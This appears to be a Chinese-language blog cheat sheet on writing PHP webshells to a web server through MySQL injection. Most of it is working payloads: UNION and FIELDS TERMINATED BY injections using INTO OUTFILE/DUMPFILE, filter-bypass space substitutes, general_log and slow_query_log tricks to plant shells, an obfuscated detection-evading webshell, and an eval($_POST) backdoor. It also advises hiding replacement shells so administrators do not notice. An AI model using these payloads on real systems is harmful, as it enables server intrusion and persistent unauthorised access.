---
title: MySQL写shell
date: 2020-1-22 20:11:00
---

**MySQL注入点，用工具对目标站直接写入一句话，需要哪些条件？**

root权限以及网站的绝对路径

## outfile和dumpfile写shell

### 利用条件

过滤了单引号into outfile还能用吗？不能，GPC要off才行，可以测试Hex编码

> 1. 数据库当前用户为root权限；
> 2. 知道当前网站的绝对路径；
> 3. `PHP`的`GPC`为 off状态；(魔术引号，GET，POST，Cookie)
> 4. 写入的那个路径存在写入权限。

### **基于UNION联合查询**：

```bash
?id=1 UNION ALL SELECT 1,'<?php phpinfo();?>',3 into outfile 'C:\info.php'%23
?id=1 UNION ALL SELECT 1,'<?php phpinfo();?>',3 into dumpfile 'C:\info.php'%23
```

### **非联合查询**

当我们无法使用联合查询时，我们可以使用`fields terminated by`与`lines terminated by`来写shell

```bash
?id=1 into outfile 'C:\info.php' FIELDS TERMINATED BY '<?php phpinfo();?>'%23
```

**代替空格的方法**

+号，`%0a`、`%0b`、`%a0` 、 /**/ 注释符等

### `outfile`和`dumpfile`的区别

`outfile`:

> 1、 支持多行数据同时导出
>
> 2、 使用union联合查询时，要保证两侧查询的列数相同 
>
> 3、 会在换行符制表符后面追加反斜杠 
>
> 4、会在末尾追加换行 

`dumpfile`:

> 1、 每次只能导出一行数据 
>
> 2、 不会在换行符制表符后面追加反斜杠 
>
> 3、 不会在末尾追加换行 

因此，我们可以使用`into dumpfile`这个函数来顺利写入二进制文件;

当然`into outfile`函数也可以写入二进制文件，只是最终无法生效罢了（追加的反斜杠会使二进制文件无法生效） 



如果服务器端本身的查询语句，结果有多行，但是我们又想使用`dump file`，应该手动添加 limit 限制

## 突破`secure-file-priv`写shell

`MySQL`的`secure-file-priv`参数是用来限制LOAD DATA, SELECT … `OUTFILE`, and LOAD_FILE()传到哪个指定目录的。

当`secure_file_priv`的值没有具体值时，表示不对`MySQL`的导入|导出做限制，如果是null，表示`MySQL`不允许导入导出。

而且在`mysql 5.6.34`版本以后 `secure_file_priv` 的值默认为NULL。并且无法用`SQL`语句对其进行修改。

## **基于日志写shell** 

（ `outfile`被禁止，或者写入文件被拦截，没写权限 ，有root权限）

```sql
show variables like '%general%';	--查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)
set global general_log = on;		--开启日志监测，默认关闭(如果一直开文件会很大的)
set global general_log_file = '/var/www/html/info.php';		--设置日志路径
select '<?php phpinfo();?>';		--执行查询，写入shell
--结束后，恢复日志路径，关闭日志监测

--SQL查询免杀shell
select "<?php $sl = create_function('', @$_REQUEST['klion']);$sl();?>";

SELECT "<?php $p = array('f'=>'a','pffff'=>'s','e'=>'fffff','lfaaaa'=>'r','nnnnn'=>'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['username']));?>";

---------------
--慢查询写shell
---------------
为什么要用慢查询写呢？上边说过开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错
show variables like '%slow_query_log%';		--查看慢查询信息
set global slow_query_log=1;				--启用慢查询日志(默认禁用)
set global slow_query_log_file='C:\\phpStudy\\WWW\\shell.php';	--修改日志文件路径
select '<?php @eval($_POST[abc]);?>' or sleep(11);				--写shell
```

## **慢查询补充**

因为是用的慢查询日志，所以说只有当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志。 

一般都是通过`long_query_time`选项来设置这个时间值，时间以秒为单位，可以精确到微秒。

如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中 

```sql
show global variables like '%long_query_time%'		--查看服务器默认时间值
```

通常情况下执行`sql`语句时的执行时间一般不会超过10s，所以说这个日志文件应该是比较小的，而且默认也是禁用状态，不会引起管理员的察觉 

拿到shell后上传一个新的shell，删掉原来shell，新shell做隐藏，这样shell可能还能活的时间长些



像这种东西还是比较适合那些集成环境,比如,`appserv`,`xampp`...因为权限全部都映射到同一个系统用户上了,如果是win平台,权限通常都比较高 

**其它方法**：通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，找上传点 `GetShell`